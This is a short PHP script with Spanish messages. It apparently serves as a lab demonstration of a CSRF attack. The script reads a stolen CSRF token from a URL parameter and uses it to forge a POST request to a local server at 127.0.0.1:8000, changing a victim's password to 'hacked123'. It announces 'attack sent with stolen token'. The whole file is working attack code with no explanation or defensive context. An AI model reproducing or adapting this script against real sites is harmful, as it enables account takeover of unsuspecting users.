<?php
if (isset($_GET['token'])) {
    $token = $_GET['token'];
    echo "✅ Ataque enviado con token robado: $token";

    $data = http_build_query([
        'new_password' => 'hacked123',
        'csrf_token' => $token
    ]);

    $context = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded",
            'content' => $data
        ]
    ]);

    file_get_contents('http://127.0.0.1:8000', false, $context);
} else {
    echo "❌ No se recibió token";
}
?>
